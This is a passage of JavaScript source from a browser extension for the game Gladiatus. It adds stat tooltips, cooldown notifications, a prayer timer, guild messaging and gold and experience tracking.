						if (data.suffix) {
							info.push(['[' + gca_locale.get("global", "suffix") + '](' + (data.suffix.level >= 0 ? data.suffix.level : '?') + ' lvl)', '#ffffff']);
							data.suffix.forEach((mat) => {
								info.push(this.getInfoRow(mat));
							});
						}
						else {
							info.push(['[' + gca_locale.get("global", "suffix") + '](? lvl)', '#ffffff']);
							info.push(['?', '#cccccc']);
						}
					}

					// Base margin
					info.push(['<div style="heigth:8px"></div>', '#000000']);

					return info;
				},

				style_extended_amounts : function(prefix, base, suffix, recipe) {
					// Tooltip info list
					var info = [];

					// Separator
					info.push(['<div style="border-bottom:1px solid #555555"></div>', '#aaaaaa']);

					// Create rows for the tooltip
					info.push([
						((prefix > 0) ? '[' + gca_locale.get("global", "prefix") + ' ' + (recipe.lvls.prefix >= 0 ? recipe.lvls.prefix : '?') + ' lvl] ' : '') +
						'[' + gca_locale.get("global", "base") + ' ' + (recipe.lvls.base >= 0 ? recipe.lvls.base : '?') + ' lvl] ' +
						((suffix > 0) ? '[' + gca_locale.get("global", "suffix") + ' ' + (recipe.lvls.suffix >= 0 ? recipe.lvls.suffix : '?') + ' lvl] ' : ''),
						'#ffffff'
					]);

					recipe.keys.forEach((i) => {
						info.push(this.getInfoRow(i, recipe.mats[i]));
					});

					// Base margin
					info.push(['<div style="heigth:8px"></div>', '#000000']);

					return info;
				}
			},
			
			// Add mercenaries types
			mercenaries : {
				// Load
				init : function(self){
					// Get cached locale names
					this.names = gca_data.section.get('cache', 'mercenary_names_locale', this.names);

					// Character Level
					this.level = parseInt(document.getElementById('header_values_level').textContent, 10);

					// Get data
					this.showMerchenaryType();
					
					// Exit if no inventory
					if(!document.getElementById("inv")) return;

					// Add event
					gca_tools.event.bag.onBagOpen(() => {
						this.showMerchenaryType();
					});

					// If bag not already loaded
					if (document.getElementById("inv").className.match("unavailable")) {
						// Wait first bag
						gca_tools.event.bag.waitBag(() => {
							this.showMerchenaryType();
						});
					}

					// If in packets
					if (gca_section.mod === "packages") {
						// On item get
						gca_tools.event.request.onAjaxResponse((response) => {
							// If package load request
							if(response.data.newPackages && response.data.pagination && response.data.worthTotal){
								this.showMerchenaryType();
							}
						});
						// On new packet page
						gca_tools.event.addListener("packages_page_loaded", () => {
							this.showMerchenaryType();
						});
					}

					// On item move
					gca_tools.event.request.onAjaxResponse((data) => {
						if (data?.data?.to?.data && data?.elem?.length === 1 && data?.elem[0]?.dataset?.hash) {
							let item = document.querySelector(`#content .ui-draggable[data-hash="${data.elem[0].dataset.hash}"]`);
							if (!item || !item.dataset) return;
							if (item && typeof(item?.dataset?.gcaFlag_isMerchenaryType) !== 'undefined') delete item.dataset.gcaFlag_isMerchenaryType;
							this.showMerchenaryType();
						}
					})
				},
				
				level : 5,

				names : [
					"Hoplomachus",//1
					"Medicus",//2
					"Thracian",//3
					"Murmillo",//4
					"Samnit",//5
					"Elite Spear Carrier",//6
					"Medicine Man",//7
					"Archer",//8
					"Experienced Archer",//9
					"Sword Wolf",//10
					"Eagle Wing",//11
					"Herbalist",//12
					"Bear Warrior",//13
					"Scorpion Warrior",
					"Axe Warrior",//15
					"Grandmaster",//16
					"Druid Master",//17
					"The Ranger",//18
					"Axe Thrower",//19
					"Chariot Driver"//20
				],

				// Show if scroll is Learned
				showMerchenaryType : function(){
					// For each item
					jQuery(".ui-draggable").each((i, item) => {
						// If already parsed
						if(item.dataset.gcaFlag_isMerchenaryType) return;
						// Flag as parsed
						item.dataset.gcaFlag_isMerchenaryType = true;

						// Get hash
						let hash = gca_tools.item.hash(item);
						if (!hash) return;
						
						// Check if item is a mercenary
						if (hash.category!=15) return;
						
						let tooltip = jQuery(item).data("tooltip")[0];

						let original_name = ( hash.subcategory <= this.names.length ) ? this.names[hash.subcategory-1] : "n/a" ;
						tooltip.splice(1, 0, [ gca_locale.get("global", "mercenary_type", {name:original_name, number:hash.subcategory}), "gray; font-size: 0.8em;"]);
						
						let merchenaryLevel = parseInt(tooltip[9][0].match(/(\d+)/i)[1]);//hash.prefix+hash.suffix;
						let characterLevel = this.level;

						//console.log(tooltip[9][0]);
						//console.log(hash);
						let value, j;
						let newRow = 0;

						// Max stats
						j = 2+newRow;
						tooltip[j] = [ [tooltip[j][0], gca_locale.get('global', 'gains_with_full_stats')], ['#BA9700', '#999']];
						
						// Strength - Chance to block
						j = 3+newRow;
						value = tooltip[j][0].match(/(\d+)/i)[1];
						value = Math.floor(value*1.5+merchenaryLevel);// max value
						dmg = Math.floor(value/10);
						value = Math.round((dmg * 52 / (characterLevel-8 ))/6*10)/10;// Block chance
						tooltip[j] = [ [tooltip[j][0], gca_locale.get('training', 'points_breakdown_damage', {integer: dmg, float: 0}).replace(' (+0)',"")], ['#999', '#BA9700']];
						// add row
						tooltip.splice(4, 0, [["", gca_locale.get('training', 'points_breakdown_block_short', {integer: value}).replace(' (+0)',"")], ['#999', '#BA9700']]);
						newRow++;
						
						// Dexterity - Critical attack
						j = 4+newRow;
						value = tooltip[j][0].match(/(\d+)/i)[1];
						value = Math.floor(value*1.5+merchenaryLevel);// max value
						dexterity = value;
						value = Math.round((Math.floor(value/10) * 52 / (characterLevel-8 ))/5*10)/10;// Avoid critical
						tooltip[j] = [[tooltip[j][0], gca_locale.get('training', 'points_breakdown_critical_hit_short', {integer: value})], ['#BA9700', '#BA9700']];
						
						// Agility - Avoid critical
						j = 5+newRow;
						value = tooltip[j][0].match(/(\d+)/i)[1];
						value = Math.floor(value*1.5+merchenaryLevel);// max value
						agility = value;
						value = Math.round((Math.floor(value/10) * 52 / (characterLevel-8 ))/4*10)/10;// Avoid critical
						tooltip[j] = [[tooltip[j][0], gca_locale.get('training', 'points_breakdown_avoid_short', {integer: value})], ['#BA9700', '#BA9700']];
						
						// Constitution - Life
						j = 6+newRow;
						value = tooltip[j][0].match(/(\d+)/i)[1];
						value = Math.floor(value*1.5+merchenaryLevel);// max value
						value = Math.floor(value*2-50);// life
						tooltip[j] = [[tooltip[j][0],gca_locale.get('training', 'points_breakdown_life', {number: value})], ['#999', '#999']];

						// Charisma - Threat
						j = 7+newRow;
						value = tooltip[j][0].match(/(\d+)/i)[1];
						value = Math.floor(value*1.5+merchenaryLevel);// max value
						charisma = value;
						value = Math.floor(value*0.7);// threat
						doubleHitFactor = Math.round(charisma*dexterity/100)/10;
						tooltip[j] = [[tooltip[j][0], gca_locale.get('training', 'points_breakdown_threat', {integer: value, float: 0}).replace(' (+0)','')], ['#999', '#999']];
						// add row
						tooltip.splice(j+1, 0, [["", gca_locale.get('training', 'points_breakdown_double_hit_factor', {number: doubleHitFactor})], ['#999', '#BA9700']]);
						newRow++;

						// Intelligence - Heal
						j = 8+newRow;
						value = tooltip[j][0].match(/(\d+)/i)[1];
						value = Math.floor(value*1.5+merchenaryLevel);// max value
						intelligence = value;
						value = Math.floor(Math.floor(value*4/5) + Math.floor(value/5)*2*(Math.floor(value/5) * 52 / (characterLevel-8 ))/800);// equivalent heal
						avoidDoubleHitFactor = Math.round(intelligence*agility/100)/10;
						tooltip[j] = [[tooltip[j][0], gca_locale.get('training', 'points_breakdown_heal', {integer: value, float: 0}).replace(' (+0)','')], ['#999', '#BA9700', '#999']];
						// add row
						tooltip.splice(j+1, 0, [["", gca_locale.get('training', 'points_breakdown_avoid_double_hit_factor', {number: avoidDoubleHitFactor})], ['#999', '#BA9700']]);
						newRow++;
						
						// Remove all last gray rows of tooltips
						for(let i = 0; i < 2; i++){
							if( tooltip[tooltip.length-1][1]=="#808080" )
								tooltip.pop()
						}

						jQuery(item).data("tooltip")[0] = tooltip;
					});
				}
			},

			// Items upgrade value
			itemUpgrades : {
				init : function(){
					// Show durability
					document.getElementById('content').className += ' show-upgrade-values';
					
					this.createUpgradeValues();
					
					// Exit if no inventory
					if(!document.getElementById("inv")) return;

					// Add event
					gca_tools.event.bag.onBagOpen(() => {
						this.createUpgradeValues();
					});

					// If bag not already loaded
					if (document.getElementById("inv").className.match("unavailable")) {
						// Wait first bag
						gca_tools.event.bag.waitBag(() => {
							this.createUpgradeValues();
						});
					}

					// If in packets
					if (gca_section.mod === "packages") {
						// On item get
						gca_tools.event.request.onAjaxResponse((response) => {
							// If package load request
							if(response.data.newPackages && response.data.pagination && response.data.worthTotal){
								this.createUpgradeValues();
							}
						});
						// On new packet page
						gca_tools.event.addListener("packages_page_loaded", () => {
							this.createUpgradeValues();
						});
					}
				},
				
				createUpgradeValues : function(){
					// Get page Items
					var items = document.querySelectorAll('div[data-content-type]');
					// Loop page's Items
					for (let i = 0; i < items.length; i++){
						// If item
						if(!items[i].dataset.gca_upgrade_value && items[i].dataset.upgrade_value == null){
							items[i].dataset.gca_upgrade_value = true;
							
							let info = gca_tools.item.info(items[i]);
							
							// If item has upgrade_value
							if(info.upgrade_value)
								items[i].dataset.upgrade_value = "+"+info.upgrade_value;
						}
					}
				}
			},
		},

		hideLanguageFlags : {
			preload : function() {
				// Detect page mods
				if (
						//run on highscore page
					gca_section.mod == 'highscore' || 
					//run on arena pages
					gca_section.mod == 'arena' || 
					//run on market page
					gca_section.mod == 'market' || 
					//run on guild market
					gca_section.mod == 'guildMarket' ||  
					//run in reports arena section (CT seems to have no flags)	
					gca_section.mod == 'reports' && gca_section.submod == 'showArena' || 
					//run in reports arena section, but if clicked via reports warning button
					gca_section.mod == 'reports' && gca_getPage.parameter('t') == '2'  
				) {
					// Insert the style if mod detected
					document.documentElement.className += " hide-flags";
					
					if (
					//disable on arena, if on Provinciarum pages
					gca_section.mod == 'arena' && gca_section.submod === 'serverArena' || 
					//disable on guild market, if on Administration page
					gca_section.mod == 'guildMarket' && gca_section.submod == 'control' || 
					//disable on highscore, if on Guilds page
					gca_section.mod == 'highscore' && gca_getPage.parameter('t') == '1' || 
					//disable on highscore, if on Search page
					gca_section.mod == 'highscore' && gca_section.submod == 'suche' 
				) {
					// Remove the style if submod detected
					document.documentElement.classList.remove("hide-flags");
					}
				}
			}
		}
	},
	
	// Underworld related functions
	underworld : {

		// Add a prey counter bar on the header
		prayCounterBar : {
			isPraying : false,

			add : function() {
				var wrapper = document.createElement('div');
				wrapper.id = 'gca_praybuff_header_values';

				var icon = document.createElement('div');
				icon.className = 'headericon_big';
				icon.style.backgroundImage = 'url("' + gca_tools.img.cdn('img/buff/healing.png') + '")';
				wrapper.appendChild(icon);

				var timer_text = document.createElement('div');
				timer_text.className = 'headervalue_big';
				wrapper.appendChild(timer_text);
				document.getElementById('header_values_pve').appendChild(wrapper);

				var bar = document.createElement('div');
				bar.className = 'cooldown_bar';
				bar.id = 'gca_praybuff_header_cooldown_bar';

				var bar_fill = document.createElement('div');
				bar_fill.className = 'cooldown_bar_fill cooldown_bar_fill_ready';
				bar.appendChild(bar_fill);

				var bar_text = document.createElement('div');
				bar_text.className = 'cooldown_bar_text';
				bar_text.textContent = '';
				bar.appendChild(bar_text);

				var action = document.createElement('a');
				action.className = 'cooldown_bar_link';
				action.addEventListener('click', () => {this.toggle();}, false);
				bar.appendChild(action);

				document.getElementById('header_game').appendChild(bar);

				// Save variables
				this.timer_text = timer_text;
				this.bar_text = bar_text;
				this.bar_fill = bar_fill;

				// Check if player has the praying buff
				var isPraying = false;
				if (gca_section.submod == 'pray' || gca_section.submod == 'prayStart') {
					if (document.getElementById('content').getElementById('duration')) {
						isPraying = true;
						// Save pray stop locale
						gca_data.section.set('cache', 'underworld_pray_stop_locale', document.getElementById('content').getElementsByTagName('a')[0].textContent.trim());
						// Save pray duration
						setTimeout(() => {
							//console.log((new Date().getTime() - window.duration * 1000));
							gca_data.section.set('cache', 'underworld_pray_started', (new Date().getTime() - window.duration * 1000));
							this.update();
						}, 500);
					}
					else {
						gca_data.section.del('cache', 'underworld_pray_started');
					}
					// Save pray locale
					gca_data.section.set('cache', 'underworld_pray_locale', document.getElementById('content').getElementsByTagName('h1')[0].textContent.trim());
				}
				else {
					let started = gca_data.section.get('cache', 'underworld_pray_started', 0);
					started = Math.round((new Date().getTime() - started) / 1000);
					let buffs = document.getElementById('localBuffs').getElementsByClassName('buff');
					let healing_buff_img = gca_tools.img.cdn('img/buff/healing.png');
					for (let i = buffs.length - 1; i >= 0; i--) {
						if(
							buffs[i].dataset.image.substr(10) == healing_buff_img.substr(10) && 
							//buffs[i].dataset.buffType == '8' && 
							(
								(/\+5%/).test(buffs[i].getAttribute('title')) || 
								(/\+5%/).test(buffs[i].getAttribute('onmousemove'))
							) &&
							Math.abs(Math.abs(parseInt(buffs[i].dataset.castStart, 10)) - started) < 5
						){
							isPraying = true;
							break;
						}
					}
				}
				this.isPraying = isPraying;

				// Update bars
				this.update();
				if (this.isPraying) {
					setInterval(() => {this.updateTime();}, 1000);
				}
			},

			update : function() {
				this.updateTime();
				this.bar_fill.className = 'cooldown_bar_fill ' + (this.isPraying ? 'cooldown_bar_fill_progress' : 'cooldown_bar_fill_ready');
				this.bar_text.textContent = (this.isPraying ? gca_data.section.get('cache', 'underworld_pray_stop_locale', '×') : gca_data.section.get('cache', 'underworld_pray_locale', '→'));
			},

			updateTime : function () {
				if (this.isPraying) {
					let started = gca_data.section.get('cache', 'underworld_pray_started', -1);
					this.timer_text.textContent = started < 0 ? '? : ? : ?' : gca_tools.time.msToHMS_String(new Date().getTime() - started, 99);
				}
				else {
					this.timer_text.textContent = '-- : -- : --';
				}
			},

			toggle : function() {
				document.location.href = gca_getPage.link({'mod': 'underworld', 'submod': (this.isPraying ? 'prayEnd' : 'prayStart')});
			}
		},

		// Update expendition link to always point to the last expendition location
		updateExpenditionLink : function(){
			let locations = document.getElementById('submenu2').getElementsByTagName('a');
			let last_location_link = locations[locations.length-1].href;

			// Update link
			if( document.getElementById('cooldown_bar_expedition').getElementsByTagName('a')[0].href != last_location_link )
				document.getElementById('cooldown_bar_expedition').getElementsByTagName('a')[0].href = last_location_link;
		}
	},

	// Background Functionality
	background : {

		// Log the Daily Bonus
		daily_bonus_log : {
			// Inject
			inject : function(){
				// If daily bonus
				if(document.getElementById('blackoutDialogLoginBonus') != null){
					// Save bonus data
					this.saveBonus();
					// If overview page
					if(gca_section.mod == 'overview'){
						gca_tools.event.fireOnce('loginBonusDataUpdated');
					}
				}
			},

			// Save bonus
			saveBonus : function(){
				// Get wrapper
				var wrapper = document.getElementById('blackoutDialogLoginBonus');
				
				// Get title
				var title = document.getElementById('header_LoginBonus').textContent;
				var description = wrapper.getElementsByClassName('loginbonus_description')[0].textContent;

				// Get bonus
				var bonus_box = wrapper.getElementsByClassName('loginbonus_bonus');
				var bonus = [];
				var daysleft = 0;

				// For each reward
				for (var i = bonus_box.length - 1; i >= 0; i--) {
					// Get reward data
					var bonus_item = {
						img : bonus_box[i].getElementsByTagName('img')[0].src,
						text : bonus_box[i].getElementsByClassName('loginbonus_text')[0].textContent,
						tooltip : false
					};
					// Check if reward is collected
					var icon = bonus_box[i].getElementsByClassName('loginbonus_icon')[0];
					if(icon.dataset.tooltip){
						bonus_item.tooltip = icon.dataset.tooltip;
						daysleft = 0;
					}
					// Not collected
					else{
						daysleft++;
					}
					
					// Store data
					bonus.unshift(bonus_item);
				}
				daysleft++;

				var day = 24*60*60*1000;
				var bonusEndDate = new Date(Math.floor(gca_tools.time.server()/day)*day + daysleft * day).getTime();

				// Save expiration timestamp
				gca_data.section.set('overview', 'daily_bonus_ends', bonusEndDate);
				// Save data
				gca_data.section.set('overview', 'daily_bonus_data', bonus);
				// Save title/description
				gca_data.section.set('overview', 'daily_bonus', {
					title : title,
					description : description
				});
			}
		},

		// Link Editor
		targetLinkEditor : {
			// Initialize
			init : function(){
				// Catch page leave
				window.addEventListener('click', (event) => {
					// Get Url
					var url = (event.target && (event.target.href || (event.target.parentNode && event.target.parentNode.href) || (event.target.parentNode && event.target.parentNode.parentNode && event.target.parentNode.parentNode.href) ) ) || false;
					// If it is a link
					if(url && url.substring(0,8) == "https://" && url.substring(8, 8 + gca_section.domain.length) == gca_section.domain){
						// Call event
						this.onLinkClick(event, url, gca_getPage.parameters(url));
					}
				}, false);
			},

			// On link click
			onLinkClick : function(event, url, page){
				// Check parameter mod
				if(!page.mod) return;
				// Delete sh
				delete page.sh;
				// Set flag
				page._updated = false;

				// Check remember
				if (gca_options.bool("global","remember_tabs")){
					this.editor_rememberTabs(page);
				}
				if (gca_options.bool("market","remember_sort")) {
					this.editor_rememberMarketSort(page);
				}

				// Check if not changed
				if (!page._updated) {
					return;
				}
				delete page._updated;

				// Create link
				url = gca_getPage.fullLink(page);
				// Patch target's link
				if(event.target.href){
					event.target.href = url;
				}else if(event.target.parentNode.href){
					event.target.parentNode.href = url;
				}else{
					event.target.parentNode.parentNode.href = url;
				}
			},

			// Pages with shop
			pagesWithShop : [
				"inventory",
				"guild_storage"
			],

			editor_rememberTabs : function (page){
				// Get type of page
				let pageType = this.pagesWithShop.indexOf(page.mod);
				// If no page of interest, return
				if (pageType < 0) return;

				// If shop is defined, save it
				if (page.subsub) {
					gca_data.section.set('cache', 'merchants_tab', page.subsub);
				}
				// Else, load it
				else {
					let cachedValue = gca_data.section.get('cache', 'merchants_tab', false);
					if (!cachedValue) return;
					page.subsub = cachedValue;
					page._updated = true;
				}
			},

			// Pages with market
			pagesWithMarket : [
				"market",
				"guildMarket"
			],

			editor_rememberMarketSort : function (page) {
				// Get type of page
				let pageType = this.pagesWithMarket.indexOf(page.mod);
				// If no page of interest, return
				if(pageType < 0) return;

				// If shop is defined, save it
				if(page.s){
					gca_data.section.set('cache', 'market_sort', page.s);
				}
				// Else, load it
				else {
					let cachedValue = gca_data.section.get('cache', 'market_sort', false);
					if (!cachedValue) return;
					page.s = cachedValue;
					page._updated = true;
				}
			}
		},
				
		// Guild message
		guildMessage : {
			// Message sending
			sending : false,
			// Sent guild message
			send : function(message, exclude_me, callback){
				// Check
				if(this.sending) return;
				this.sending = true;

				// Get Info
				var guild = {
					inGuild : gca_data.section.get('guild', "inGuild", false),
					mates : gca_data.section.get('guild', "mates", [])
				}
				
				// Check if valid data
				if(!guild.inGuild || guild.mates.length < 1){
					return false;
				}

				// Prepare post data
				var postData = {};
				for (var i = guild.mates.length - 1; i >= 0; i--){
					if(!exclude_me || guild.mates[i].id != gca_section.playerId)
						postData["qq"+guild.mates[i].id] = guild.mates[i].id;
				}
				// Message attach
				postData["mailText"] = message;
				// Button name
				postData["sendmails"] = "sendmails";

				// Save instance
				var self = this;
				// Sent message
				jQuery.ajax({
					type: "POST",
					url: gca_getPage.link({"mod":"guild","submod":"adminMail"}),
					data: postData,
					success: function(){
						self.sending = false;
						if(callback) callback(true);
					},
					error: function(){
						self.sending = false;
						if(callback) callback(false);
					}
				});
				return true;
			}
		},

		// Notifications Events
		notify_me : {

			// Cooldown Sound Notification for missions, dungeons and arenas
			cooldown_sounds : {
				init : function(){
					// If no sounds and no notifications
					if(!gca_options.bool("sound","cooldown_sound_notifications") && !gca_options.bool("global","browser_notifications")){
						// No way to notify the user
						return;
					}

					// Wait a sec
					setTimeout(() => {
						// Missions
						this.initActionCooldown("cooldown_bar_text_expedition", "expedition-notification", expeditionProgressBar.readyText, "expedition");
						// Dungeon
						this.initActionCooldown("cooldown_bar_text_dungeon", "dungeon-notification", dungeonProgressBar.readyText, "dungeon");
						// Arena
						this.initActionCooldown("cooldown_bar_text_arena", "arena-notification", arenaProgressBar.readyText, "arena");
						// Arena Turma
						this.initActionCooldown("cooldown_bar_text_ct", "turma-notification", ctProgressBar.readyText, "turma");
					}, 500);
				},

				initActionCooldown : function(id, sound, readyText, icon) {
					// Get button
					var button = document.getElementById(id);
					// Check no button
					if(!button) return;

					// Cooldown
					var cooldown = button.textContent.match(/(\d+):(\d+):(\d+)/);
					// Check id cooldown
					if(cooldown){
						// Calculate cooldown
						cooldown = (parseInt(cooldown[1], 10) * 60 * 60 + parseInt(cooldown[2], 10) * 60 + parseInt(cooldown[3], 10))*1000;
						// Setup a timeout
						setTimeout(function(){
							if(gca_options.bool("sound","cooldown_sound_notifications")){
								gca_audio.play(sound);
							}

							// If notifications enabled
							if(gca_options.bool("global","browser_notifications") && readyText && readyText.length > 0){
								// Browser notification
								gca_notifications.browser(false, readyText, "icons/icon_" + icon + ".png", function(){
									// Set focus on window
									window.focus();
									// Close notification
									this.close();
									// On click go to link
									var link = button.parentNode.getElementsByTagName("a");
									if(link.length > 0)
										window.location.href = link[0].href;
								});
							}
						}, cooldown);
					}
				}
			},

			// Check for guild application
			new_guild_application : function(){
				// Get saved data
				var lastTime = gca_data.section.get("timers", "notify_new_guild_application", 0);
				// If an application is pending
				if(lastTime == -1){
					gca_notifications.info(gca_locale.get("global", "notification_guild_application"), gca_getPage.link({"mod":"guild","submod":"admin"}));
					// Save time
					gca_data.section.set("timers", "notify_new_guild_application", gca_tools.time.server());
				}
				// Else if it's time to check
				else if(gca_tools.time.server() - lastTime >= gca_options.int("global","check_guild_application_pinned_messages_interval") * 60000){
					// Save time
					gca_data.section.set("timers", "notify_new_guild_application", gca_tools.time.server());
					// Check guild for any application
					jQuery.get(gca_getPage.link({"mod":"guild","submod":"admin"}), function(content){
						// If application exist
						if(content.match('submod=adminApplication')){
							// Save
							gca_data.section.set("timers", "notify_new_guild_application", -1);
							// Notify
							gca_notifications.info(gca_locale.get("global", "notification_guild_application"), gca_getPage.link({"mod":"guild","submod":"admin"}));
						}
					});
				}
			},
			
			// Check if guild attack ready
			guild_attack_ready : function(){
				// Get saved data
				var lastTime = gca_data.section.get("timers", "notify_guild_attack_ready", 0);
				// If an application is pending
				if(lastTime == -1){
					gca_notifications.info(gca_locale.get("global", "notification_guild_attack_ready"), gca_getPage.link({"mod":"guild_warcamp"}));
					// Save time
					gca_data.section.set("timers", "notify_guild_attack_ready", gca_tools.time.server());
				}
				// Else if it's time to check
				else if(gca_tools.time.server() - lastTime >= gca_options.int("global","notify_guild_attack_ready_interval") * 60000){
					// Save time
					gca_data.section.set("timers", "notify_guild_attack_ready", gca_tools.time.server());
					// Check guild if attack is ready
					jQuery.get(gca_getPage.link({"mod":"guild_warcamp"}), function(content){
						// If application exist
						if(!content.match('data-ticker-loc')){
							// Save
							gca_data.section.set("timers", "notify_guild_attack_ready", -1);
							// Notify
							gca_notifications.info(gca_locale.get("global", "notification_guild_attack_ready"), gca_getPage.link({"mod":"guild_warcamp"}));
						}
					});
				}
			},
			
			// Minimum health warning
			healthWarning : function(){
				//Check settings and current HP
				let total_health = parseInt(document.getElementById('header_values_hp_percent').innerText);
				let minimum_health = gca_options.get("global", "health_warning");
				// Send notifications			
				if (total_health < minimum_health && gca_options.bool("global","browser_notifications") && (Notification.permission === "granted")){
					new Notification("Gladiatus Crazy Addon", {body: gca_locale.get("global", "health_notification") + " " + gca_options.get("global", "health_warning") + "%!", icon: gca_resources.folder + 'icons/icon.png'}),
					document.getElementById("header_game").classList.add("hp_warning_btn");	
				}
				else if (total_health < minimum_health){
					gca_notifications.error(gca_locale.get("global", "health_notification") + " " + gca_options.get("global", "health_warning") + "%!"),
					document.getElementById("header_game").classList.add("hp_warning_btn");	
				}
			}
		},

		// Get guild pinned message
		guildPinnedMessage : function(){
			// Get saved data
			var lastTime = gca_data.section.get("timers", "guild_pinned_message", 0);
			// If it's time to check
			if(gca_tools.time.server() - lastTime >= gca_options.int("global","check_guild_application_pinned_messages_interval") * 60000){
				// Save time
				gca_data.section.set("timers", "guild_pinned_message", gca_tools.time.server());
				// Check baths room 1
				jQuery.get(gca_getPage.link({"mod":"guild_bath","submod":"guild_shoutbox","room":"1"}), function(content){
					let player = null;
					let message = null;
					// If a pinned message exist
					let match_results = content.match('<a[^>]+>([^>]+)</a>[^<]+<span[^>]+>[^<]+</span>\\s*</td>\\s*</tr>\\s*<tr>\\s*<td style="padding-bottom: 5px">\\[⚲\\](.*?)<\/td');//([^<]+)
					if(match_results){
						// Save
						player = match_results[1];
						message = match_results[2].replace(/<br>/gi,'\r\n').trim();
						// Notify
						console.log(`[GCA] Pinned guild message found from ${player}: ${message}`);
						// Save
						gca_data.section.set('cache', 'guild_pinned_message_sender', player);
						gca_data.section.set('cache', 'guild_pinned_message', message);
					}else{
						console.log(`[GCA] No pinned guild message found`);
						gca_data.section.del('cache', 'guild_pinned_message_sender');
						gca_data.section.del('cache', 'guild_pinned_message');

					}
				});
			}
		},
		
		// Gold/Exp data
		gold_exp_data : {
			inject : function(){
				// Collect data
				this.collect();
				// Show gold_exp_data button
				this.create_button();
			},
			
			collect : function(){
				// Check every 5 mins
				if (new Date().getTime() - gca_data.section.get('cache', 'gold_exp_data_last_checked', 0) < 5*60*1000) {
					return;
				}
				
				// Get exp
				var exp = document.getElementById('header_values_xp_bar').dataset.tooltip.match(/"(\d+) \\\/ (\d+)"/i);
				if (!exp) {
					gca_data.section.set('cache', 'gold_exp_data_last_checked', new Date().getTime());
					console.log("GCA: Could not get exp data.");
					return;
				}
				
				// Go to achievements page and collect gathered gold data
				jQuery.get(gca_getPage.link({'mod':'overview','submod':'achievements'}), (content) => {
					// Just checked
					gca_data.section.set('cache', 'gold_exp_data_last_checked', new Date().getTime());

					// Get info
					var gold = content.match(/<section class="achievement_detail_box" id="cat0"[^>]*>\s*<[^>]+>\s*<div class="achievement_name">[^<]*<\/div>\s*<div class="achievement_detail_current">\s*([\d\.]+)/);
					if (!gold) {
						console.log('GCA: Could not get gold data.');
						return;
					}

					// Get server date
					var serverDate = gca_tools.time.ajaxServer(content);
					// Calculate new data
					var newData = [
						// Current gold
						parseInt(gold[1].replace(/\./g, ''), 10),
						// Current EXP
						parseInt(exp[1], 10),
						// Server time
						serverDate,
						// EXP for next level up (this is needed to calculate exp after level up)
						parseInt(exp[2], 10)
					];

					// Get saved data (again just to be sure)
					var data = gca_data.section.get('data', 'gold_exp_data', []);

					// Check if first time saving data
					if (!data.length) {
						console.log('GCA: Collected gold and exp data for the first time.', newData);
						gca_data.section.set('data', 'gold_exp_data', [newData]);
						return;
					}

					// Get last saved data
					var lastData = data[data.length - 1];
					
					// If new gold/exp are different from last saved data
					if (lastData[0] != newData[0] || lastData[1] != newData[1]) {
						console.log('GCA: Collected more gold and exp data.', newData);

						// Push data
						data.push(newData);
						
						// Toss old data
						let clear_data = [];
						let seventh_day_timestamp = serverDate - 6048e5; // Server time - 7 days (7 days = 7*24*60*60*1000 = 604800000 ms)
						for (let i = 0; i < data.length; i++) {
							// If time is in the last 7 days
							if (data[i][2] >= seventh_day_timestamp)
								clear_data.push(data[i]);
						}
						data = clear_data;
						
						// Save data
						gca_data.section.set('data', 'gold_exp_data', data);
						return;
					}

					// If not enough data saved
					if (data.length < 2) {
						console.log('GCA: Collected dummy gold and exp data.', newData);
						data.push(newData);
						gca_data.section.set('data', 'gold_exp_data', data);
						return;
					}

					// Else
					console.log('GCA: No new gold and exp data.', newData);
					//console.log('Saved data:', data);
				});
			},
			
			// Create Gold & EXP data button
			create_button : function(){
				// Create stats icon
				var icon = document.createElement('a');
				icon.id = "exp_and_gold_stats_icon";
				// Insert on page
				document.getElementById("header_game").appendChild(icon);
				// On click handler
				icon.addEventListener('click', () => {
					// Open data
					this.open();
				}, false);
			},
			
			// Gold & EXP data Dialog
			dialog : false,
			// Canvas chart
			canvas : false,

			// Open Dialog
			open : function(){
				// If dialog exist
				if(this.dialog){
					// Open dialog
					this.dialog.open();
					// Exit
					return;
				}

				// Create a dialog
				var dialog = new gca_build.dialog;
				this.dialog = dialog;
				dialog.smallHead(true);
				dialog.title.textContent = gca_locale.get("global", "gold_exp_data");
				
				var table = document.createElement('table');
				table.style = "width: 100%;text-align: center;";
				dialog.body.appendChild(table);
				var tr = document.createElement('tr');
				tr.style = "font-weight: bold;";
				tr.appendChild(document.createElement('td'));
				tr.appendChild(document.createElement('td'));
				tr.appendChild(document.createElement('td'));
				table.appendChild(tr);
				tr = document.createElement('tr');
				tr.appendChild(document.createElement('td'));
				tr.appendChild(document.createElement('td'));
				tr.appendChild(document.createElement('td'));
				table.appendChild(tr);
				tr = document.createElement('tr');
				tr.appendChild(document.createElement('td'));
				tr.appendChild(document.createElement('td'));
				tr.appendChild(document.createElement('td'));
				table.appendChild(tr);
				tr = document.createElement('tr');
				tr.appendChild(document.createElement('td'));
				tr.appendChild(document.createElement('td'));
				tr.appendChild(document.createElement('td'));
				table.appendChild(tr);
				tr = document.createElement('tr');
				tr.appendChild(document.createElement('td'));
				tr.appendChild(document.createElement('td'));
				tr.appendChild(document.createElement('td'));
				table.appendChild(tr);
				tr = document.createElement('tr');
				tr.appendChild(document.createElement('td'));
				tr.appendChild(document.createElement('td'));
				tr.appendChild(document.createElement('td'));
				table.appendChild(tr);
				table.getElementsByTagName("tr")[0].getElementsByTagName("td")[0].style = "width: 40%;";
				table.getElementsByTagName("tr")[0].getElementsByTagName("td")[1].textContent = unescape(JSON.parse('"' +document.getElementById('header_values_xp_bar').dataset.tooltip.match(/"([^:]+):"/i)[1]+ '"'));
				table.getElementsByTagName("tr")[0].getElementsByTagName("td")[2].textContent = unescape(JSON.parse('"' +document.getElementById('icon_gold').dataset.tooltip.match(/"([^"]+)"/i)[1]+ '"'));
				table.getElementsByTagName("tr")[1].getElementsByTagName("td")[0].textContent = gca_locale.get("global", "gold_exp_data_today") + ":";
				table.getElementsByTagName("tr")[2].getElementsByTagName("td")[0].textContent = gca_locale.get("global", "gold_exp_data_week") + ":";
				table.getElementsByTagName("tr")[3].getElementsByTagName("td")[0].textContent = gca_locale.get("global", "gold_exp_data_avg_day") + ":";
				table.getElementsByTagName("tr")[4].getElementsByTagName("td")[0].textContent = gca_locale.get("global", "gold_exp_data_to_level_up") + ":";
				table.getElementsByTagName("tr")[5].getElementsByTagName("td")[0].textContent = gca_locale.get("global", "gold_exp_data_package_tax") + ":";
				table.getElementsByTagName("tr")[1].getElementsByTagName("td")[0].style = "font-weight: bold;";
